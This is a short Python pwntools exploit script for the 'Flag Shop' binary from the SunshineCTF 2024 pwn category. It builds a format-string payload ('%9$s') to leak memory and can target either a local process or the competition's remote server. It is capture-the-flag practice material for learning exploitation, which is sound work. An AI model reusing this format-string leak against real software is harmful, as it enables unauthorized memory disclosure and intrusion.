#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/SunshineCTF 2024/pwn/Flag Shop/flagshop')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    payload = b'1'
    payload = payload.ljust(0xa, b'A')
    payload += b'%9$s'
    payload = payload.ljust(0x1b, b'A')

    r.sendlineafter(b'[ Enter your username ]\n', b'A')
    r.sendlineafter(b'[ Enter your pronouns ]\n', b'A')
    r.recvuntil(b'=\n')
    r.sendlineafter(b'=\n', payload)
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('2024.sunshinectf.games', 24001)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
